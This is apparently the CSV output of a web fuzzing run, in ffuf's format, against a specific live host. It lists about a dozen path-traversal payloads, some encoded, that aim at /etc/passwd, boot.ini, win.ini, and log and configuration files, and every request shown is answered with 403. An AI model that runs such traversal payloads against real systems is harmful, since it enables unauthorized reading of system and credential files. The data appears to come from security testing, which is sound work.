FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord.officevibe.com/cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,57730,403,312,17,7,text/html; charset=us-ascii,30.862005ms,
//../../data/config/microsrv.cfg,https://overlord.officevibe.com///../../data/config/microsrv.cfg,,63058,403,312,17,7,text/html; charset=us-ascii,28.320019ms,
../../apache/logs/access.log,https://overlord.officevibe.com/../../apache/logs/access.log,,65127,403,312,17,7,text/html; charset=us-ascii,27.867332ms,
..\\..\\..\\..\\..\\..\\..\\boot.ini,https://overlord.officevibe.com/..\\..\\..\\..\\..\\..\\..\\boot.ini,,65982,403,312,17,7,text/html; charset=us-ascii,28.137902ms,
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord.officevibe.com/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,67936,403,312,17,7,text/html; charset=us-ascii,28.02348ms,
static/..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/static/..%5c..%5c..%5cetc/passwd,,70464,403,312,17,7,text/html; charset=us-ascii,27.702085ms,
../webserver.ini,https://overlord.officevibe.com/../webserver.ini,,73462,403,312,17,7,text/html; charset=us-ascii,28.032928ms,
xyz/../../ThinVnc.ini,https://overlord.officevibe.com/xyz/../../ThinVnc.ini,,74299,403,312,17,7,text/html; charset=us-ascii,28.005857ms,
static/../../../a/../../../../etc/passwd,https://overlord.officevibe.com/static/../../../a/../../../../etc/passwd,,74451,403,312,17,7,text/html; charset=us-ascii,31.928698ms,
static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,77730,403,312,17,7,text/html; charset=us-ascii,28.171151ms,
..%5c..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/..%5c..%5c..%5c..%5cetc/passwd,,78884,403,312,17,7,text/html; charset=us-ascii,27.884659ms,
../../logs/error.log,https://overlord.officevibe.com/../../logs/error.log,,84935,403,312,17,7,text/html; charset=us-ascii,28.001121ms,
static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,88703,403,312,17,7,text/html; charset=us-ascii,28.544506ms,
static/../../../../windows/win.ini.,https://overlord.officevibe.com/static/../../../../windows/win.ini.,,88730,403,312,17,7,text/html; charset=us-ascii,28.295446ms,
